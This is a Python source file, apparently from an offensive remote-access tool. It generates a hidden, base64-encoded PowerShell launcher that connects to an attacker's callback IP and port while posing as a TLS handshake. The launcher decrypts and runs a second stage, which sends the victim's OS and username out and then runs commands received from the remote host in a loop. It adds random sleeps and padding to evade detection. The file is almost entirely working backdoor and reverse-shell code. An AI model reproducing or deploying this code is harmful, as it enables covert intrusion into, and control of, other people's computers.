from src.Utilities import *

import base64

class Payload:
        def enc(callback_ip: str, callback_port: str, encoded_clienthello: str) -> str:
                payload  = 'start powershell -wi h -a {'
                payload += 'function d($r,$k){$p=[byte[]]@();'
                payload += 'for($i=0;$i-lt$r.length;$i++){$p+=($r[$i]-$k[$i%32]+255)%256}return $p};'
                payload += '$b=\'' + encoded_clienthello + '\';'
                payload += '$h=[convert]::frombase64string($b);'
                payload += '$a=[net.sockets.tcpclient]::new(\'' + callback_ip + '\',' + str(callback_port) + ');'
                payload += '$s=$a.getstream();'
                payload += '$s.write($h,0,50);'
                payload += '$b=[byte[]]::new(65535);'
                payload += '1..64|%{$q=$s.read($b,0,1)};'
                payload += '$q=$s.read($b,0,65535);'
                payload += '$l=(([int]$b[3])-shl 8)-bor$b[4];'
                payload += '$k=$b[5..1028];'
                payload += 'iex([text.encoding]::utf8.getstring($(d $b[1029..(4+$l)]$k)))}'

                return payload

        def stage() -> bytes:
                payload  = b''
                payload += b'$Key = $k' + b'\n'
                payload += b'$Stream = $s' + b'\n'
                payload += b'class Stream { [IO.Stream] $IOStream; [Byte[]] $Buffer; [IAsyncResult] $Operation }' + b'\n'
                payload += b'function Encrypt ($Data, $Key) {' + b'\n'
                payload += b'    $Cipher = [Byte[]] @()' + b'\n'
                payload += b'    for ($i = 0; $i -lt $Data.Length; $i++) {' + b'\n'
                payload += b'        $Cipher += ($Data[$i] + $Key[$i % 32] + 1) % 256' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    return [Byte[]] $Cipher' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Decrypt ($Data, $Key) {' + b'\n'
                payload += b'    $Plain = [Byte[]] @()' + b'\n'
                payload += b'    for ($i = 0; $i -lt $Data.Length; $i++) {' + b'\n'
                payload += b'        $Plain += ($Data[$i] - $Key[$i % 32] + 255) % 256' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    return [Byte[]] $Plain' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Application-ify ($Data) {' + b'\n'
                payload += b'    $Application = [Byte[]] @(0x17, 0x03, 0x03)' + b'\n'
                payload += b'    $Cipher = [Byte[]] (Encrypt $Data $Key)' + b'\n'
                payload += b'    $CipherLength = [Byte[]] [BitConverter]::GetBytes($Cipher.Length)[1,0]' + b'\n'
                payload += b'    $ApplicationData = [Byte[]] ($Application + $CipherLength + $Cipher)' + b'\n'
                payload += b'    return [Byte[]] $ApplicationData' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Application-defy ($Data) {' + b'\n'
                payload += b'    $DataLength = ([Int] $Data[3] -shl 8) -bor $Data[4]' + b'\n'
                payload += b'    $Cipher = $Data[5..(5 + $DataLength)]' + b'\n'
                payload += b'    $Plain = Decrypt $Cipher $Key' + b'\n'
                payload += b'    return [Byte[]] $Plain' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Get-RandomData ' + b'\n'
                payload += b'{' + b'\n'
                payload += b'    $Amount = Get-Random (200..500)' + b'\n'
                payload += b'    $Data = [Byte[]] @()' + b'\n'
                payload += b'    foreach ($Iteation in 1..$Amount) { ' + b'\n'
                payload += b'        $Byte = [Byte] (Get-Random (0..255))' + b'\n'
                payload += b'        $Data += $Byte' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    return [Byte[]] $Data' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Sleep-Random {' + b'\n'
                payload += b'    $Milliseconds = Get-random (1000..9999)' + b'\n'
                payload += b'    Start-Sleep -Milliseconds $Milliseconds' + b'\n'
                payload += b'}' + b'\n'
                payload += b'$Encoding = [Text.Encoding]::UTF8' + b'\n'
                payload += b'$Os = $Encoding.GetBytes([Runtime.InteropServices.RuntimeInformation]::OSDescription)' + b'\n'
                payload += b'$OsLength = [Byte[]] [BitConverter]::GetBytes($Os.Length)[1,0]' + b'\n'
                payload += b'$Username = $Encoding.GetBytes([Environment]::UserName)' + b'\n'
                payload += b'$Information = [Byte[]] ($OsLength + $Os + $Username)' + b'\n'
                payload += b'$Data = [Byte[]] (Application-ify $Information)' + b'\n'
                payload += b'$BytesWritten = $Stream.Write($Data, 0, $Data.Length)' + b'\n'
                payload += b'$Buffer = [Byte[]]::new(65535)' + b'\n'
                payload += b'$AcknowledgeByte = 0x1' + b'\n'
                payload += b'$RequestByte = 0x2' + b'\n'
                payload += b'$HasData = 0x3' + b'\n'
                payload += b'$Prompt = "$(prompt)"' + b'\n'
                payload += b'$EncodedOutput = [Byte[]] @($HasData)' + b'\n'
                payload += b'$EncodedOutput += $Encoding.GetBytes($Prompt)' + b'\n'
                payload += b'$Packet = [Byte[]] (Application-ify $EncodedOutput)' + b'\n'
                payload += b'$BytesWritten = $Stream.Write($Packet, 0, $Packet.Length)' + b'\n'
                payload += b'$BytesRead = $Stream.Read($Buffer, 0, $Buffer.Length)' + b'\n'
                payload += b'while ($a.Connected) {' + b'\n'
                payload += b'    Sleep-Random' + b'\n'
                payload += b'    $Request = [Byte[]] @($RequestByte)' + b'\n'
                payload += b'    $Request += [Byte[]] $(Get-RandomData)' + b'\n'
                payload += b'    $Request = [Byte[]] $(Application-ify $Request)' + b'\n'
                payload += b'    $BytesWritten = $Stream.Write($Request, 0, $Request.Length)' + b'\n'
                payload += b'    $BytesRead = $Stream.Read($Buffer, 0, $Buffer.Length)' + b'\n'
                payload += b'    $Data = [Byte[]]::new($BytesRead)' + b'\n'
                payload += b'    [Array]::Copy($Buffer, 0, $Data, 0, $BytesRead)' + b'\n'
                payload += b'    $Clean = [Byte[]] (Application-defy $Data)' + b'\n'
                payload += b'    if ($Clean[0] -ne $HasData) {' + b'\n'
                payload += b'        continue' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    $Length = ([Int] $Clean[1] -shl 8) -bor $Clean[2]' + b'\n'
                payload += b'    $EncodedCommand = [Byte[]]::new($Length)' + b'\n'
                payload += b'    [Array]::Copy($Clean, 3, $EncodedCommand, 0, $Length)' + b'\n'
                payload += b'    $DecodedCommand = $Encoding.GetString($EncodedCommand)' + b'\n'
                payload += b'    $Output = iex $DecodedCommand | Out-String' + b'\n'
                payload += b'    $Prompt = "$(prompt)"' + b'\n'
                payload += b'    $Final = $Output + $Prompt' + b'\n'
                payload += b'    $EncodedOutput = [Byte[]] @($HasData)' + b'\n'
                payload += b'    $EncodedOutput += $Encoding.GetBytes($Final)' + b'\n'
                payload += b'    $Packet = [Byte[]] (Application-ify $EncodedOutput)' + b'\n'
                payload += b'    $BytesWritten = $Stream.Write($Packet, 0, $Packet.Length)' + b'\n'
                payload += b'    $BytesRead = $Stream.Read($Buffer, 0, $Buffer.Length)' + b'\n'
                payload += b'}' + b'\n'

                return payload

        def encrypt(data: bytes, key: bytes) -> bytes:
                cipher                  = bytearray()

                for _ in range(len(data)):
                        cipher.append((data[_] + key[_ % 32] + 1) % 256)

                return bytes(cipher)

        def decrypt(data: bytes, key: bytes) -> bytes:
                plain                   = bytearray()

                for _ in range(len(data)):
                        plain.append((data[_] - key[_ % 32] + 255) % 256)

                return bytes(plain)

        def powershell(payload: str) -> str:
                return "powershell -enc {}".format(base64.b64encode(payload.encode('utf-16-le')).decode('ascii'))

        def base_64(data: bytes) -> bytes:
                return base64.b64encode(data).decode('ascii')